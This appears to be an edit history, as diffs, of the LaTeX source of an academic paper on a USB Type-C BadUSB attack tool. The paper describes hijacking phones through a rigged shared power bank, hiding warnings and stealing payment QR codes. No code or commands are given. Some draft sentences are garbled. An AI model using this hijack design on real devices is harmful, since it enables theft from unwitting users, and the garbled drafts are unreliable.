+other peripherals also requires dedicated transferring lanes as their standards
 are not compatible with \ac{USB} in most cases.
@@
 Thus, to provide support towards a wider range of peripherals, a 24-pins
-standard called \ac{USB} Type-C~\cite{typec} is introduced in 2013 by \ac{USB}-IF~\cite{usbif}. As it is designed to be double-sided, the number of actually usable
+standard called \ac{USB} Type-C~\cite{typec} was introduced in 2013 by \ac{USB}-IF~\cite{usbif}. As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability
@@
 %\noindent\outline{Security Problem}\\
-During the development of \ac{USB} specification, security was considered insufficiently~\cite{sok}. As
+During the development of \ac{USB} specification, security was insufficiently considered~\cite{sok}. But \shuqing{but?}
 the \ac{USB}-IF believes it is the duty of \acp{OEM}

### 2021-03-10 WOOT/Files/conclusion.tex
free conclusion from GoodUSB

@@
 types of subsequent attacks. By experimenting \tool with mobile phones, tablets,
-and PCs, we further test its ability under different modes and shows it can
-bypass defenses such as GoodUSB~\cite{tian2015defending}. In our user study, we
+and PCs, we further test its ability under different modes. In our user study, we
 obtain and analyze video stream extracted from 10 participants with \tool,
@@
 Responsible disclosure have already been carried out, we have already contacted Huawei and Apple through proper channel and are waiting for mitigation being deployed.
-By now, we have already heard from Huawei PSIRT who has already been analyzing this security issue while Apple has not responded yet.
+We revived response from Huawei on \nth{7} March and discussed about the mitigation plan on \nth{10} March while Apple has not responded yet.

### 2021-03-10 WOOT/Files/experiment.tex

--- 2021-03-10 WOOT/Files/experiment.tex
@@
 
-\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the \ac{USB} 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the \ac{HID} Emulator.
+\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone, the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the \ac{USB} 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the \ac{HID} Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
@@
 	\item \textbf{Dismiss Notification}:
-		In our experiment, we found that some devices will notify the user presence of an external screen. During our experiment, the following notifications are raised: 
+		In our experiment, we found that some devices will notify the user the presence of an external screen. During our experiment, the following notifications are raised: 
 		\begin{itemize}
@@
 		To avoid being discovered by the victim, \tool can inject keystrokes and mouse movement to dismiss some of these notifications.
-For example, in the first case, \tool is able to inject a sequence of mouse movement to set the screen at mirror mode to dismiss the pop-up.
+For example, in the first case, \tool is able to inject a sequence of mouse movements to set the screen at mirror mode to dismiss the pop-up.
 \end{itemize}
@@
 During this experiment, \tool disguised itself as a normal keyboard and an external screen as feedback channel.
-When first plugged in, the victim's devices raise a pop-up window asking victim's what mode should new screen be set to.
+When first plugged in, the victim's devices raise a pop-up window asking victims what mode should new screen be set to.
 \tool immediately inject a sequence of mouse movement and click to set itself as a mirror to the primary monitor.
@@
 
-\textbf{Sharing Power Bank}.  Sharing power bank provides users with short-term
+\textbf{Sharing Power Bank}.  Sharing power banks provide users with short-term
 rental of power banks.  The company deploys power bank stations in the city and
@@
 
-Not only does sharing power bank provides convenience to users, but it also
+Not only do sharing power bank provide convenience to users, but it also
 brings security issues.  We noticed that most of the power bank stations do not
@@
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
-As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code paymeinformation from the video stream.  When the victim viewed text or photos withnt is typically performed in the following steps:
+As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code payment information from the video stream.
+When the victim viewed text or photos withnt\shuqing{?} is typically performed in the following steps:
 \ding{182} The client presents the payment QR code on the mobile device to the merchant.
@@
 for micropayment purchases. For example, WeChat
-Pay~\cite{Wechat-pay} regards transaction under USD \textdollar 154 as
+Pay~\cite{Wechat-pay} regards transactions under USD \textdollar 154 as
 micropayments.  Different from a typical payment procedure, when micropayments
@@
 payment code, which is to refresh the QR code every minute. This is sufficient
-to stop an attack like sneak shots but unable to stop a real-time attack like our
+to stop an attack like opportunistic theft of QR code but unable to stop a real-time attack like our
 \tool.  In summary, the payment QR code is highly sensitive on users' devices
@@
 In this part, we will introduce a real-life attack scenario to show that our
-\tool is a practical offensive tool.  This scenario can be decomposed into the
+\tool is a practical offensive tool.  This scenario can be broken down into the
 following steps.
@@
 Next, we summarize the possible threats toward users under different modes.
-\hongyi{Better way to express this?}
+%\hongyi{Better way to express this?}
 First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor script into victims' devices.
-Moreover, using video capture mode, once the victims access their sensitive data like QR payment  code or album, their sensitive data will be immediately transmitted via \tool to the attacker.
+Moreover, using video capture mode, once the victims accesses their sensitive data such as QR payment  code or photos, their sensitive data will be immediately transmitted via \tool to the attacker.
 Lastly, with full control mode, the attacker has complete control over the victims' device and can conduct any action on the victim device.
@@
 To further validate our attacking scenario, we invited 10 volunteers, who are students in our university, to participate and conduct a user study.
-Before the user study experiment, we disclose to the volunteers how their data might be used and request permission from the volunteers and the university ethics review boards.
-During the case study, volunteers took turns to use their phones for half an hour with \tool connected, which are considered as a normal power bank.
-To obtain data close to real-life, they are requested to use phones like when they use the normal shared power banks.
+Before the user study experiment, we discloses to the volunteers how their data might be used and request permission from the volunteers and the university ethics review boards.
+During the case study, volunteers took turns to use their phones for half an hour with \tool connected, which is considered as a normal power bank usage time.
+To obtain data close to real-life, they were requested to use phones just as they would when normally using the shared power banks.\shuqing{check}
 After each experiment, the raw video and the corresponding \ac{OCR} result file will be generated automatically, then we presented these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
@@
 During the automatic analysis, we used scripts to perform \ac{OCR} recognition for each frame in the recorded videos and stored all of the \ac{OCR} results in a database.
-In total, there are 94,058 entries of data collected among 10 volunteers.
+In total, there are 94,058 entries of data collected from 10 volunteers.
 %\shuqing{The data may need to be updated.}

### 2021-03-10 WOOT/Files/introduction.tex
Intro

@@
 The \ac{USB} protocol has become popular worldwide
-since its appearance, as it provides a unified and easy-to-use approach for a
+since its appearance\shuqing{When?}, as it provides a unified and easy-to-use approach for a
 extensive range of devices to communicate with each other.  From version 1.0 till
@@
 
-On the other side of the coin, the security of \ac{USB} has caused severe problems.
+Conversely, the security of \ac{USB} has caused severe problems.
 Recent research of all USB specifications indicates that security has not been taken into consideration.~\cite{sok}  There are more than 400
-vulnerabilities referencing \ac{USB} on CVE list~\cite{website:CVE-list}.  As a
+vulnerabilities related to \ac{USB} on CVE list~\cite{website:CVE-list}.  As a
 result, many attackers exploit these vulnerabilities and the
@@
 BadUSB is a well-known class of firmware attacks~\cite{badusb}.  These attacks
-are conducted by modifying the device firmware, which will disguise
+are conducted by modifying the device firmware, which are disguised
  as ordinary \ac{USB} devices as other types of devices that are \textit{trust-by-default}
-by the hosts.  Typical simulated devices include \ac{HID}~\cite{hid} and disks.  Utilizing BadUSB,
-attackers can pretend themselves as regular users, typing malicious commands to
-victim computers, downloading and executing malicious scripts, and copying out
-private data from disks.  Such attacks can easily escape from traditional
+by the hosts.  Typically, simulated devices include \ac{HID}~\cite{hid} and disks.  Utilizing BadUSB,
+attackers can pretend to be regular users, typing malicious commands to
+victims' computers, downloading and executing malicious scripts, and copying out
+private data from disks.  Such attacks can easily \shuqing{arg1} get detected by from traditional
 anti-virus software since it is hard to distinguish them from ordinary \ac{USB}
@@
 
-In this work, we proposed our approach addressing the limitations mentioned
+In this work, we addressed the limitations mentioned
 above and implemented a multi-mode attack model of \ac{USB}, named \tool.  \tool
@@
 victim's graphical interface during attacks.  Combining it with the emulation
-of traditional \acp{HID} like keyboards and mice, attackers are capable of
-performing precise attacks.  We did experiments to verify that \tool could also
-bypass some countermeasures for BadUSB since they often rely on interaction
-with the graphical interface.  Moreover, we implemented multiple attacking
+of traditional \acp{HID}, e.g., keyboards and mice, attackers are capable of
+performing precise attacks.  
+%We did experiments to verify that \tool could also
+%bypass some countermeasures for BadUSB since they often rely on interaction
+%with the graphical interface.  
+Moreover, we implemented multiple attacking
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
@@
 Ten volunteers are involved in the user study.
-Finally, we found that 4,796 of 94,058 records obtained by \tool are related to users' privacy information.
+Finally, we found that 4,796 of 94,058 records obtained by \tool are related to users' privacy information, demonstrating the \shuqing{importance of our re?}.
 After the validation of our attack model, we

### 2021-03-10 WOOT/Files/related_work.tex

@@
 to the environment which may contain sensitive information. Leveraging this
-physical phenomenon, previous works~\cite{smartphone,
+physical phenomenon, previous research~\cite{smartphone,
 poweremi,revealing,su2017usb,usbgpslocator,bates2014leveraging,badusbhub,usbfinger,side,usbdriver}
-eavesdrop on leaked signals and recover the sensitive data. In a similar fashion,
+eavesdrop on leaked signals and recover the sensitive data. In a similar fashion,\shuqing{citation}
 \cite{usbee,turnip} emit electromagnetic emissions by data injection on the bus
@@
 Under the premise of ensuring the full functionality of \ac{USB} devices, some works
-improve the security during the connection establishment. Windows Defender
+improve the security while establishing connection. Windows Defender
 ATP~\cite{windenfenderwhite} maintains a whitelist of \ac{USB} devices, only devices
@@
 sources to his/her whitelist without precaution. Fortunately, some designs have proposed to overcome
-this drawback. For instance, Mohammadmoradi \emph{et al.}~\cite{mohammadmoradi2018making} propose a strategy to generate such a
+this drawback. For instance, Mohammadmoradi \emph{et al.}~\cite{mohammadmoradi2018making}\shuqing{check name} propose a strategy to generate such a
 whitelist automatically. This strategy first generates a unique fingerprint for
@@
 series of authorizations are completed. These authorizations are designed to be
-performed manually, thus the malicious devices will be detected for making a different claim 
+performed manually, thus the malicious devices will be detected if they make a different claim 
 that does not match the authorization results. 
@@
 feature vector constructed with the data collected from \acp{URB}, 
-it would detect the novel \ac{USB} packets based on the machine learning algorithm and send 
+it detects the novel \ac{USB} packets based on the machine learning algorithm and sends 
 a alert to the user before enumeration. As BadUSB attacks normally request privileged 
@@
 prevent BadUSB attacks from the malicious flash drive by analyzing
-the temporal characteristics of BadUSB-liked attacks. This defense mechanism is
+the temporal characteristics of BadUSB-like attacks. This defense mechanism is
 effective because the attacker cannot obtain the screen of the host using
@@
 Therefore, there exists a clear trade-off between the effectiveness and the
-\ac{PnP} property. Though hardware disabling solutions like \ac{USB} Condom
-archives almost absolute security, the functionality of \ac{USB} is sacrificed.
+\ac{PnP} property. Although hardware disabling solutions like \ac{USB} Condom
+achieves almost absolute security, the functionality of \ac{USB} is sacrificed.
 Other solutions like whitelist are either bypassable or insufficient

### 2021-03-10 WOOT/BadUSBC.tex
Update

@@
     extended BadUSB to support the new \ac{USB} Type-C features and proposed a
-    multi-mode attack model, \tool.  It obtains UI status to make attacks more 
+    multi-mode attack model, \tool.  This obtains UI status to make attacks more 
     precise and effective.  To the best of our knowledge, \tool is the first attack model
@@
     conducted extensive experiments and a user study on a real-life attack
-    scenario.  10 volunteers are involved in, and 4,172 of 94,058 records
+    scenario.  Ten volunteers participated. 4,172 of 94,058 records
     obtained by \tool in the user study are related to sensitive information.

### 2021-03-10 WOOT/Files/badusb.tex
Update

@@
 technical background would not treat normal-looking \ac{USB} device as malicious and be cautious about them. This assumption is consistent with existing works~\cite{JFCImpact}. Moreover, we omit the
-effect of notifications from \ac{USB} devices, as users may not have the knowledge to fully understand such notifications. In
-fact, during our experiment, no device had security notifications raised about
-suspicious \ac{USB} devices and only mobile devices had raised a charging notification
-about our \tool, which may not be a sufficient warning for users.
+effect of notifications from \ac{USB} devices, as users may not have the knowledge to fully understand such notifications.
 
@@
 
-\textbf{\ac{HID} Emulation Mode.} This mode mainly relies on the ``\ac{HID} Emulator'' in the Figure\shuqing{fig 3 delete?}~\ref{fig:attack_model} to
+\textbf{\ac{HID} Emulation Mode.} This mode mainly relies on the ``\ac{HID} Emulator'' in Figure~\ref{fig:attack_model} to
 send constructed \ac{HID} packet to the victim. These constructed \ac{HID} packets are
 interpreted by the victim as valid keystrokes and mouse moves. Thus, the
-attacker can executes arbitrary scripts on the victim's device. This is the
+attacker can execute arbitrary scripts on the victim's device. This is the
 function of the original BadUSB. Based on this, we made the following
@@
 
-First, as \tool has established a feedback channel using \ac{USB} 3.2 protocol, when performing keystroke and mouse movement injection, attacker can obtain real-time feedback from the victim's devices.
+First, as \tool has established a feedback channel using \ac{USB} 3.2 protocol, when performing keystroke and mouse movement injection, an attacker can obtain real-time feedback from the victim's devices.
 This feedback allows an attacker to tell whether the previous attack succeeded and decide what to perform next.
@@
 the victim's device treat \tool as an external display, but also a valid \ac{HID}
-input source. Hence we can achieve complete hijack of victim's device.
+input source. Hence we can achieve complete hijack of the victim's device.
 
@@
 
-This mode enables attacker to perform delicate operations that are beyond
+This mode enables attackers to perform delicate operations that are beyond
 automation. Moreover, this mode provides a backdoor that does not require a host
@@
 
-The advantage of this mode is that it can completely hijack the victims device
+The advantage of this mode is that it can completely hijack the victim's device
 and provides a backdoor beyond detection of firewalls; however, this complete control

### 2021-03-10 WOOT/Files/experiment.tex
Update

@@
 	\item \textbf{Dismiss Notification}:
-		In our experiment, we found that some devices will notify the user the presence of an external screen. During our experiment, the following notifications are raised: 
+		In our experiment, we found that some devices will notify the user the presence of an external screen. During our experiment, the following notifications were raised: 
 		\begin{itemize}
@@
 		 \item On Huawei P30, it showed a status bar indicator and a persistent notification about the external monitor.
-		 \item On iPad Pro (\nth{3} generation), it also showed a blue status bar indicator and a notification about \ac{USB} accessories if iPad is locked.
+		 \item On iPad Pro (the third generation), it also showed a blue status bar indicator and a notification about \ac{USB} accessories if iPad is locked.
 		\end{itemize}
-		To avoid being discovered by the victim, \tool can inject keystrokes and mouse movement to dismiss some of these notifications.
+		To avoid being discovered by the victim, \tool can inject keystrokes and mouse movements to dismiss some of these notifications.
 For example, in the first case, \tool is able to inject a sequence of mouse movements to set the screen at mirror mode to dismiss the pop-up.
@@
 During this experiment, \tool disguised itself as a normal keyboard and an external screen as feedback channel.
-When first plugged in, the victim's devices raise a pop-up window asking victims what mode should new screen be set to.
-\tool immediately inject a sequence of mouse movement and click to set itself as a mirror to the primary monitor.
+When first plugged in, the victim's devices raise a pop-up window asking victims what mode should the new screen be set to.
+\tool immediately injects a sequence of mouse movements and clicks to set itself as a mirror to the primary monitor.
 Thus we have successfully completed the attack initialization.
-Then we tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of which resulting in success.
-Compared to original BadUSB attacks like Rubber Ducky, our \tool can provide attacker real-time feedback which allows attacker to perform more accurate attack.
+Then we tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of which resulted in success.
+Compared to original BadUSB attacks like Rubber Ducky, our \tool can provide attackers real-time feedback which allows attackers to perform more accurate attacks.
 %This also warned us that we need more thorough defense against such BadUSB
@@
 text, \tool used the techniques of \ac{OCR}  to
-extract text from corresponding video frames. In this experiment, the attacker had
-successfully extracted text like name, address, ID number, and other sensitive
+extract text from corresponding video frames. In this experiment, the attacker
+successfully extracted text such as name, address, ID number, and other sensitive
 personal information. We also tested the payment code extractor, which enables
@@
 conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video
-stream from the target device to the attacker via WiFi.  After the connection
-establishment, the attacker performed a series of actions to test the capability of
+stream from the target device to the attacker via WiFi.  After establishing the connection, the attacker performed a series of actions to test the capability of
 \tool. In the beginning, the attacker accessed the album application on the iPad and
-obtained all the photos inside. After that, the attacker sent messages via victim's
+obtained all the photos inside. After that, the attacker sent messages via the victim's
 account. At last, the attacker performed a transaction using the
@@
 emulation, \tool extensively expanded the attack capability of BadUSB,
-especially in mobile devices. In short, we have archived the complete hijack of the victim's
+especially in mobile devices. In short, we have achieved the complete hijack of the victim's
 device in this experiment.
@@
 We first introduce the technical background of our case study, sharing power
-bank service and QR code payment.
+banks and QR code payment.
 
-\textbf{Sharing Power Bank}.  Sharing power banks provide users with short-term
+\textbf{Sharing Power Banks}.  Sharing power banks provide users with short-term
 rental of power banks.  The company deploys power bank stations in the city and
@@
 
-Not only do sharing power bank provide convenience to users, but it also
-brings security issues.  We noticed that most of the power bank stations do not
+Sharing power banks not only provide convenience to users, but also bring security issues.  We noticed that most of the power bank stations do not
 check the integrity of power banks during the rental process, and users are
@@
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
+====================================================
 As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code payment information from the video stream.  
-When the victim viewed text or photos withnt\shuqing{?} is typically performed in the following steps:
+When the victim viewed text or photos withnt is typically performed in the following steps:
+====================================================
 \ding{182} The client presents the payment QR code on the mobile device to the merchant.
@@
 payment code, which is to refresh the QR code every minute. This is sufficient
-to stop an attack like opportunistic theft of QR code but unable to stop a real-time attack like our
+to stop an attack like opportunistic theft of a payment code but unable to stop a real-time attack like our
 \tool.  In summary, the payment QR code is highly sensitive on users' devices

### 2021-03-10 WOOT/Files/related_work.tex
Update

@@
 support video transmission, there exists a protocol called \ac{MHL} which extends the \ac{USB} standard and allows the video signal to
-be transmitted through the \ac{USB} interface. JFC~\cite{JFC}, short for Juicy Filming Attacks is an example that abuses this standard and exfiltrate video data
+be transmitted through the \ac{USB} interface. JFA~\cite{JFC}, short for Juice Filming Attacks is an example that abuses this standard and exfiltrates video data
 from the victim without permission. However, in JFC, this data exfiltration is not
@@
 to the environment which may contain sensitive information. Leveraging this
-physical phenomenon, previous research~\cite{smartphone,
+physical phenomenon, previous works~\cite{smartphone,
 poweremi,revealing,su2017usb,usbgpslocator,bates2014leveraging,badusbhub,usbfinger,side,usbdriver}
-eavesdrop on leaked signals and recover the sensitive data. In a similar fashion,\shuqing{citation}
-\cite{usbee,turnip} emit electromagnetic emissions by data injection on the bus
-with the connected \ac{USB} devices as an RF transmitter and \cite{usbkiller,cable}
+eavesdrop on leaked signals and recover the sensitive data. In a similar fashion, USBee\cite{usbee} and TURNIPSCHOOL\cite{turnip} emit electromagnetic emissions by data injection on the bus
+with the connected \ac{USB} devices as an RF transmitter and USBKiller\cite{usbkiller}
 inject analog
@@
 feature vector constructed with the data collected from \acp{URB}, 
-it detects the novel \ac{USB} packets based on the machine learning algorithm and sends 
+detects the novel \ac{USB} packets based on the machine learning algorithm and sends 
 a alert to the user before enumeration. As BadUSB attacks normally request privileged 

### 2021-03-10 WOOT/Files/countermeasure.tex
Update

@@
 
-Authorization mechanisms like GoodUSB~\cite{tian2015defending} have been
-proposed as countermeasures against BadUSB attacks. As mentioned in
-Section~\ref{sec:badusb} and Section~\ref{sec:experiment}, GoodUSB relies on
-internal display for authorization, which can be bypassed via our \tool. 
+%Authorization mechanisms like GoodUSB~\cite{tian2015defending} have been
+%proposed as countermeasures against BadUSB attacks. As mentioned in
+%Section~\ref{sec:badusb} and Section~\ref{sec:experiment}, GoodUSB relies on
+%internal display for authorization, which can be bypassed via our \tool. 
 %Hence, GoodUSB is indeed a great defense against traditional BadUSB attack but
@@
 conducted on the dedicated hardware instead of the internal display, preventing
-the host from being hijacked. Though \mbox{USBCheckIn} is an adequate defense against
+the host from being hijacked. Although \mbox{USBCheckIn} is an adequate defense against
 \tool, the external hardware brings additional cost and inconvenience,
@@
 \textbf{Isolated \ac{UI} Rendering.} During our experiments, we noticed that \tool
-is actually unable to redirect out the locking screen keyboard from the iPad
+is actually unable to mirror the lock screen keyboard from the iPad
 OS. Instead, the keyboard is only available on the internal display. However,
-this defense is only enabled on the locking screen keyboard, other keyboards
+this defense is only enabled on the lock screen keyboard, other keyboards
 (e.g., the virtual ones used by the apps) are still vulnerable to our \tool.
@@
 contents).
-For example, in Figure~\ref{fig:isolated_ui}, the `password' and `keyboard' are recognized as sensitive while other parts of content are in sensitive.
-Thus, the `password' and `keyboard' are not rendered on untrusted screen.
+For example, in Figure~\ref{fig:isolated_ui}, the ``password'' and ``keyboard'' are recognized as sensitive while other parts of content are insensitive.
+Thus, the ``password'' and ``keyboard'' are not rendered on untrusted screen.
 

### 2021-03-10 WOOT/Files/discussion.tex
Update

@@
 To begin with, when \tool is attached, the victim's device may not be set to mirror the screen.
-Depending on victim's settings, the \tool may be used as an extended monitor or not be enabled at all.
-Additionally, some smartphone vendor (e.g.
+Depending on the victim's settings, the \tool may be used as an extended monitor or not be enabled at all.
+Additionally, some smartphone vendors (e.g.
 Huawei and Smartisan) provide a Desktop Mode to users, which displays a desktop on external screen instead of mirroring.
-In these cases, \tool is either easily noticeable to victim or disabled.
+In these cases, \tool is either easily noticeable to the victim or disabled.
 Apart from that, we also noticed that in most devices, when an external monitor is connected to the device, there will be notifications about the monitor.
@@
 Also, it cannot be ignored that DisplayPort over \ac{USB} is not available on all devices.
-When selecting devices to test \tool, we find that many smartphones equipped with USB-C connector does not support \ac{USB} 3.2 protocol.
-This lack of support further limited \tool.
+When selecting devices to test \tool, we find that many smartphones equipped with USB-C connectors do not support \ac{USB} 3.2 protocol.
+Such lack of support further limits \tool.
 \begin{comment}
@@
 technologies develop rapidly, more and more devices will be equipped with USB-C
-capabilities, which makes \tool more influential.  Due to the neglect to
-check the security of plugged-in \ac{USB} devices of non-professional users, \tool
-can be hardly detected by them while attacks are performing.  The popularity
-and universality of public \ac{USB} devices, including sharing power banks, even
+capabilities, which makes \tool more influential.  
+Since non-professional users often neglect checking the security of plug-in \ac{USB} devices, they are often unaware of the attacks from \tool.
+can be hardly detected by them while attacks are performing.  
+The popularity and universality of public \ac{USB} devices, including sharing power banks, even
 increase such risks.  Moreover, \tool provides a better way for traditional
@@
 Attackers can use such technologies to perform more precise attacks, such as
-interacting with the user interface, as well as control the consequences of their
+interacting with the user interface and controlling the consequences of their
 attacks.  In summary, \tool can be applied in various application scenarios and

### 2021-03-10 WOOT/Files/experiment.tex
Update

@@
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
-====================================================
-As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code payment information from the video stream.  
-When the victim viewed text or photos withnt is typically performed in the following steps:
-====================================================
+As illustrated in Figure~\ref{fig:qr_payment_procedure},
+ QR code payments are typically performed in the following steps:
 \ding{182} The client presents the payment QR code on the mobile device to the merchant.
@@
 	\item After the modification, an attacker-crafted power bank is returned to a rental station in a crowded area like an airport or railway station, which increases the probability of success.
-	\item A user borrows the modified power bank and connects it to her own device, becoming the victim of \tool.
+	\item A user borrows the modified power bank and connects it to his/her own device, becoming the victim of \tool.
 	\item The attacker now has complete control over the victim and can perform various attacks using different modes.
@@
 First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor script into victims' devices.
-Moreover, using video capture mode, once the victims accesses their sensitive data such as QR payment  code or photos, their sensitive data will be immediately transmitted via \tool to the attacker.
+Moreover, using video capture mode, once the victims access their sensitive data such as QR payment  code or photos, their sensitive data will be immediately transmitted via \tool to the attacker.
 Lastly, with full control mode, the attacker has complete control over the victims' device and can conduct any action on the victim device.
@@
 To further validate our attacking scenario, we invited 10 volunteers, who are students in our university, to participate and conduct a user study.
-Before the user study experiment, we discloses to the volunteers how their data might be used and request permission from the volunteers and the university ethics review boards.
-During the case study, volunteers took turns to use their phones for half an hour with \tool connected, which is considered as a normal power bank usage time.
-To obtain data close to real-life, they were requested to use phones just as they would when normally using the shared power banks.\shuqing{check}
-After each experiment, the raw video and the corresponding \ac{OCR} result file will be generated automatically, then we presented these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
-It protects their privacy and is also a mark for us to confirm that the data we find contains their private data.
+Before the user study experiment, we disclosed to the volunteers how their data might be used and request permission from the volunteers and the university ethics review boards.
+During the case study, volunteers took turns to use their phones for half an hour with \tool connected.
+To obtain data close to real-life, they were requested to use phones just as they were normally using sharing power banks.
+After each experiment, the raw video and the corresponding \ac{OCR} result file was generated automatically, then we presented these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
+This protects their privacy and is also a mark for us to confirm that the data we find contains their private data.
 At last, he/she would destroy all original files, leave only the desensitized \ac{OCR} result for us.
-\shuqing{Do we need to mention that agreement the conference required here?}
-\hongyi{I'm also quite concern about this.}
+%\shuqing{Do we need to mention that agreement the conference required here?}
+%\hongyi{I'm also quite concern about this.}
 
@@
 During the automatic analysis, we used scripts to perform \ac{OCR} recognition for each frame in the recorded videos and stored all of the \ac{OCR} results in a database.
-In total, there are 94,058 entries of data collected from 10 volunteers.
+In total, there are 94,058 entries of data from 10 volunteers.
 %\shuqing{The data may need to be updated.}
@@
 We searched the result database with the keywords \textit{account, username, password, phone number and email}, as well as the regular expression of email.
-The records searched by such keywords and regular expression are usually related to privacy information of users.
-For example, when we searched with \textit{account} as a keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example} and Table~\ref{table:information_extracted}.
+The records searched by such keywords and regular expressions are usually related to privacy information of users.
+For example, when we searched with \textit{account} as a keyword, victim's accounts could be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example} and Table~\ref{table:information_extracted}.
 %\shuqing{Statistics.}

### 2021-03-10 WOOT/Files/related_work.tex
Update

@@
 Moreover, Mueller \emph{et al.}~\cite{MuellerZN19} improve the security without changing user experience.
-It can detect the presence of the user, block malicious device in the user's absenc until the session is unlocked.
+It can detect the presence of the user, block malicious device in the user's absence until the session is unlocked.
 
-After the \ac{USB} enumeration and driver loading, some related works
-archive `defense in depth'
-against BadUSB attacks.  Neuner \emph{et al.}~\cite{neuner2018usblock}
+After the \ac{USB} enumeration and driver loading, some related works follow the \textit{defense in depth} approach to defend against BadUSB attacks.  
+Neuner \emph{et al.}~\cite{neuner2018usblock}
 prevent BadUSB attacks from the malicious flash drive by analyzing

### 2021-03-10 WOOT/Files/introduction.tex

@@
 The \ac{USB} protocol has become popular worldwide
-since its appearance\shuqing{When?}, as it provides a unified and easy-to-use approach for a
+since its appearance in 1996, as it provides a unified and easy-to-use approach for a
 extensive range of devices to communicate with each other.  From version 1.0 till
@@
 victims' computers, downloading and executing malicious scripts, and copying out
-private data from disks.  Such attacks can easily \shuqing{arg1} get detected by from traditional
+private data from disks.  Such attacks can easily avoid detection by traditional
 anti-virus software since it is hard to distinguish them from ordinary \ac{USB}
@@
 them from taking subsequent moves.  For example, it is hard for attackers to
-locate specific functional \ac{UI} patterns like buttons and links on victim
-computers by disguising \ac{USB} devices like mice.  That explains why typical
+locate specific functional \ac{UI} patterns such as buttons and links on victim
+computers by disguising \ac{USB} devices, e.g., mice.  This explains why typical
 BadUSB attacks often only stay in the command line, using commands to download
@@
 peripherals such as DisplayPort, HDMI and PowerDelivery.  BadUSB attacks
-can become more effective with the help of newly supported features in \ac{USB} 3.0.
+can become more effective with the help of newly supported features in \ac{USB} 3.x.
 (3) There have emerged multiple efficacious countermeasures after the
@@
 the functions of \ac{USB} devices to users' expectations~\cite{tian2015defending}.
-It provides a graphical interface for users to describe the functionalities or
+It provides a \ac{GUI} for users to describe the functionalities or
 roles of the \ac{USB} device and reject any usage beyond the description.
@@
 Ten volunteers are involved in the user study.
-Finally, we found that 4,796 of 94,058 records obtained by \tool are related to users' privacy information, demonstrating the \shuqing{importance of our re?}.
+Finally, we found that 4,796 of 94,058 records obtained by \tool are related to users' privacy information.
 After the validation of our attack model, we

### 2021-03-10 WOOT/Files/badusb.tex
fix typo

@@
 ``valuable'' or not by a customized detector. We implemented a simple
-payment code detector for the poof-of-concept purpose, which demonstrates that we successfully transfer money from a victim to an
+payment code detector for the proof-of-concept purpose, which demonstrates that we successfully transfer money from a victim to an
 attacker. More detail can be obtained in Section~\ref{sec:experiment}.

### 2021-03-12 WOOT/Files/badusb.tex
proofreading done

@@
 
-We build our threat model on the basic assumptions that common users without
-technical background would not treat normal-looking \ac{USB} device as malicious and be cautious about them. This assumption is consistent with existing works~\cite{JFCImpact}. Moreover, we omit the
+We build our threat model on a basic assumption that common users without
+technical background would not treat a normal-looking \ac{USB} device as malicious and be cautious about them. This assumption is consistent with existing works~\cite{JFCImpact}. Moreover, we omit the
 effect of notifications from \ac{USB} devices, as users may not have the knowledge to fully understand such notifications.
@@
 However, these attacks suffer from various drawbacks: \ding{182} attackers can
-only simulate limited types of devices such as \acp{HID} (like keyboards and mice)
+only simulate limited types of devices such as \acp{HID} (e.g. keyboards and mice)
 and disks, which makes the attacks less effective; \ding{183} accurate attacks
-could not be performed due to lack of \ac{UI} status. Whatever \ac{HID} the
+could not be performed due to lack of \ac{UI} status. Whatever \acp{HID} the
 attackers simulate their \ac{USB} devices to be, they could not obtain the \ac{UI} to
@@
 In this work, we utilize the new features of \ac{USB} 3.x~\cite{usb31,usb32} to
-address the problem above.  Benefiting from the latest protocol, we simulate
-external display and thus obtain the video stream to perform accurate
+address the problems above.  Benefiting from the latest protocol, we simulate
+an external display and thus obtain the video stream to perform accurate
 attacks.
@@
 
-	\item\underline{\ac{HID} Emulator} emulates \ac{HID} device which can be controlled from the attacker.
+	\item\underline{\ac{HID} Emulator} emulates \ac{HID} device which can be controlled by the attacker.
 
@@
 fully-functional mouse emulation. This function enables attacks toward pure \ac{GUI}
-programs and shows attacks in the mobile attack scenarios. Details can
+programs and shows potential in the mobile attack scenarios. Details can
